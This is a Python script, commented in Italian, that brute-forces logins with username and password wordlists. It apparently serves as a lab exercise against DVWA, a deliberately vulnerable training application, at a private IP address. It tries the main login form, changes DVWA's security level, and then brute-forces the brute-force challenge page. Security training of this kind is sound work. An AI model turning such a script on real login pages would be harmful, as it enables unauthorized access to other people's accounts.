import os
import requests
from colorama import Fore, Style, init

# Inizializza colorama per output colorato
init()

# Chiede all'utente di inserire il nome dei file per username e password
file_username = input("Inserisci il nome del file dell'username: ")
file_password = input("Inserisci il nome del file delle password: ")

# Verifica se il file degli username esiste
if not os.path.isfile(file_username):
    print(Fore.RED + f"Il file {file_username} non esiste." + Style.RESET_ALL)
    exit(1)

# Verifica se il file delle password esiste
if not os.path.isfile(file_password):
    print(Fore.RED + f"Il file {file_password} non esiste." + Style.RESET_ALL)
    exit(1)

# Legge il file degli username e memorizza gli username in una lista
with open(file_username, 'r') as file:
    lista_username = [line.strip() for line in file.readlines()]

# Legge il file delle password e memorizza le password in una lista
with open(file_password, 'r') as file:
    lista_password = [line.strip() for line in file.readlines()]

# Imposta l'indirizzo IP e l'URL per il login
indirizzo_ip = "192.168.50.101"
url_login = f"http://{indirizzo_ip}/dvwa/login.php"

print("Inizio dei tentativi di login all'indirizzo:", url_login)

# Inizializza una sessione di richieste
sessione = requests.Session()

# Flag per indicare se il login è riuscito
login_success = False

# Tenta di effettuare il login con ogni combinazione di username e password
for username in lista_username:
    for password in lista_password:
        print(Fore.YELLOW + f"Tentativo con: {username} - {password}" + Style.RESET_ALL)

        dati_login = {'username': username, 'password': password, 'Login': 'Login'}

        risposta = sessione.post(url_login, data=dati_login)

        if "Login failed" not in risposta.text:
            print(Fore.GREEN + f"Login riuscito con le credenziali: {username} - {password}" + Style.RESET_ALL)
            login_success = True
            break
    if login_success:
        break

# Se nessun login è riuscito, stampa un messaggio di errore e termina il programma
if not login_success:
    print(Fore.RED + "Nessun login riuscito con le credenziali fornite." + Style.RESET_ALL)
    exit(1)

# Imposta l'URL per la pagina di sicurezza e chiede all'utente di scegliere un livello di sicurezza
url_sicurezza = f"http://{indirizzo_ip}/dvwa/security.php"
livello_sicurezza = input("Scegli il livello di sicurezza (low, medium, high): ")
dati_sicurezza = {'security': livello_sicurezza, 'seclev_submit': 'Submit'}

# Invia la richiesta per cambiare il livello di sicurezza
risposta = sessione.post(url_sicurezza, data=dati_sicurezza)
if risposta.status_code == 200:
    print(Fore.GREEN + "Livello di sicurezza cambiato con successo" + Style.RESET_ALL)
else:
    print(Fore.RED + "Errore nel cambio del livello di sicurezza." + Style.RESET_ALL)

# Tentativi di forza bruta per il login
url_forza_bruta = f"http://{indirizzo_ip}/dvwa/vulnerabilities/brute/"
print("Prova di login all'URL:", url_forza_bruta)

for username in lista_username:
    for password in lista_password:
        print(Fore.YELLOW + f"Tentativo di login con: {username} - {password}" + Style.RESET_ALL)
        url_con_credenziali = f"{url_forza_bruta}?username={username}&password={password}&Login=Login"
        risposta = sessione.get(url_con_credenziali)

        if "Username and/or password incorrect." not in risposta.text:
            print(Fore.GREEN + f"Login riuscito con username: {username} e password: {password}" + Style.RESET_ALL)
            break
    else:
        continue
    break
